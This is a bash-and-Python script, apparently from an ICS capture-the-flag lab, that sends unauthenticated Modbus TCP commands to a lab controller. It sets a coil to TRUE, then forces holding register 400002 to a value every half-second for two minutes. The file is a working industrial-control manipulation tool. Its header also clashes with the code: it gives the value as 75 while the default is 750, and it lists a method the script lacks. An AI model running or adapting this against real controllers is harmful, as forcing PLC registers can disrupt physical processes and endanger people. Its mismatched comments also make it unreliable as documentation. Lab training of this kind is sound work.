#!/usr/bin/env bash
# ============================================================
#  write_modbus.sh
#  Grassr00tz 2026 — Modbus Lab Exercise
#
#  Sends value 750 to holding register 400002 on a Modbus TCP
#  server via Function Code 6 (Write Single Register).
#
#  Target : 10.10.10.11:502
#  Address: 400002  → register offset 1 (400001-based, 0-indexed)
#  Value  : 75 (0x004B)
#
#  Usage (from inside netshoot_gr container):
#    bash /root/write_modbus.sh
#    bash /root/write_modbus.sh <ip> <register> <value>
#
#  Methods tried in order:
#    1. mbpoll  (if installed)
#    2. modbus-cli / node (if installed)
#    3. Python3 raw-socket (always available in netshoot)
# ============================================================

HOST="${1:-10.10.10.11}"
PORT=502
UNIT_ID=1

# 400002 -> 0-based register address = 400002 - 400001 = 1
REGISTER_40K="${2:-400002}"
REG_ADDR=$(( REGISTER_40K - 400001 ))

VALUE="${3:-750}"

echo "============================================"
echo "  Modbus TCP Write Single Register (FC 06)"
echo "  Target  : ${HOST}:${PORT}"
echo "  Address : ${REGISTER_40K}  (offset ${REG_ADDR}, 0-indexed)"
echo "  Value   : ${VALUE}"
echo "============================================"
echo ""

# ── Method 1: mbpoll ────────────────────────────────────────
if command -v mbpoll &>/dev/null; then
    echo "[*] Using mbpoll..."
    # -t 4   = holding registers (4x)
    # -r     = starting register (1-based for mbpoll)
    mbpoll -t 4 -r "$(( REG_ADDR + 1 ))" -1 "${HOST}" "${VALUE}"
    STATUS=$?
    if [ $STATUS -eq 0 ]; then
        echo "[+] mbpoll write succeeded."
        exit 0
    else
        echo "[-] mbpoll failed (exit ${STATUS}), trying next method..."
    fi
fi

# ── Method 2: Python3 raw socket (no extra packages needed) ─
if command -v python3 &>/dev/null; then
    echo "[*] Using Python3 raw socket..."
    python3 - <<PYEOF
import socket, struct, sys, time

HOST      = "${HOST}"
PORT      = ${PORT}
UNIT_ID   = ${UNIT_ID}
REG_ADDR  = ${REG_ADDR}      # 0-indexed
VALUE     = ${VALUE}

# ── Build Modbus TCP Application Data Unit (ADU) ──────────
#  MBAP Header (7 bytes)
#    Transaction ID : 2 bytes
#    Protocol ID    : 2 bytes  (always 0x0000)
#    Length         : 2 bytes  (bytes following, i.e. PDU length)
#    Unit ID        : 1 byte
#  PDU (6 bytes for FC06)
#    Function Code  : 0x06
#    Register Addr  : 2 bytes
#    Register Value : 2 bytes

TRANSACTION_ID = 0x0001
PROTOCOL_ID    = 0x0000
PDU_LENGTH     = 6          # Unit ID + FC + 2-byte addr + 2-byte value = 6? No:
                             # Length field = bytes from Unit ID onward = 1+1+2+2 = 6

pdu  = struct.pack('>BBHH', UNIT_ID, 0x06, REG_ADDR, VALUE)
mbap = struct.pack('>HHH', TRANSACTION_ID, PROTOCOL_ID, len(pdu))
adu  = mbap + pdu

# ── First: Write boolean TRUE to coil 00002 (FC 05) ────────
coil_addr = 1  # 00002 - 00001 = 1 (0-indexed)
coil_value = 0xFF00  # TRUE in Modbus coil format
pdu_coil = struct.pack('>BBHH', UNIT_ID, 0x05, coil_addr, coil_value)
mbap_coil = struct.pack('>HHH', TRANSACTION_ID, PROTOCOL_ID, len(pdu_coil))
adu_coil = mbap_coil + pdu_coil

print("[*] Writing boolean TRUE to coil 00002...")
try:
    with socket.create_connection((HOST, PORT), timeout=5) as s:
        s.sendall(adu_coil)
        response = s.recv(256)
        if len(response) >= 8:
            t_id, p_id, length, u_id, fc = struct.unpack('>HHHBB', response[:8])
            if fc == 0x05:
                print(f"[+] Coil 00002 set to TRUE\n")
            else:
                print(f"[-] Unexpected response for coil write: FC {fc:#04x}\n")
        else:
            print(f"[-] Short response for coil write\n")
except Exception as e:
    print(f"[-] Coil write failed: {type(e).__name__}\n")

# ── Then: Repeatedly write to holding register 400002 ──────
print(f"  TX frame : {adu.hex(' ').upper()}")
print(f"  Writing every 0.5s for 2 minutes (240 iterations)...\n")

def cleanup_coil():
    """Write FALSE to coil 00002 on exit."""
    try:
        coil_addr = 1  # 00002 - 00001 = 1 (0-indexed)
        coil_value = 0x0000  # FALSE in Modbus coil format
        pdu_coil = struct.pack('>BBHH', UNIT_ID, 0x05, coil_addr, coil_value)
        mbap_coil = struct.pack('>HHH', TRANSACTION_ID, PROTOCOL_ID, len(pdu_coil))
        adu_coil = mbap_coil + pdu_coil
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            s.sendall(adu_coil)
            response = s.recv(256)
            print("[*] Cleanup: Wrote boolean FALSE to coil 00002")
    except Exception as e:
        print(f"[!] Cleanup failed: {type(e).__name__}")

start_time = time.time()
iteration = 0
max_iterations = 240  # 2 minutes / 0.5 seconds = 240

try:
    try:
        while iteration < max_iterations:
            iteration += 1
            try:
                with socket.create_connection((HOST, PORT), timeout=5) as s:
                    s.sendall(adu)
                    response = s.recv(256)

                    # Parse response
                    if len(response) >= 8:
                        t_id, p_id, length, u_id, fc = struct.unpack('>HHHBB', response[:8])
                        # FC 06 echo: reg addr + value follow
                        if fc == 0x06 and len(response) >= 12:
                            reg, val = struct.unpack('>HH', response[8:12])
                            elapsed = time.time() - start_time
                            print(f"[{iteration:3d}] {elapsed:6.1f}s : Register {400001 + reg} set to {val}")
                        elif fc == (0x06 | 0x80):
                            exc_code = response[8] if len(response) > 8 else '?'
                            print(f"[-] Iteration {iteration}: MODBUS EXCEPTION {exc_code}")
                        else:
                            print(f"[?] Iteration {iteration}: Unexpected FC {fc:#04x}")
                    else:
                        print(f"[-] Iteration {iteration}: Short response ({len(response)} bytes)")

            except (socket.timeout, ConnectionRefusedError, Exception) as e:
                print(f"[-] Iteration {iteration}: {type(e).__name__}")

            # Sleep 0.5 seconds before next write
            if iteration < max_iterations:
                time.sleep(0.5)

        elapsed = time.time() - start_time
        print(f"\n[+] Completed {iteration} writes in {elapsed:.1f}s")

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[!] Interrupted after {iteration} writes ({elapsed:.1f}s)")

finally:
    cleanup_coil()
PYEOF
    exit $?
fi

# ── Fallback: nothing usable found ──────────────────────────
echo "[-] No Modbus tool found and Python3 unavailable."
echo "    Install mbpoll:  apt-get install -y mbpoll"
echo "    or ensure python3 is in PATH."
exit 127
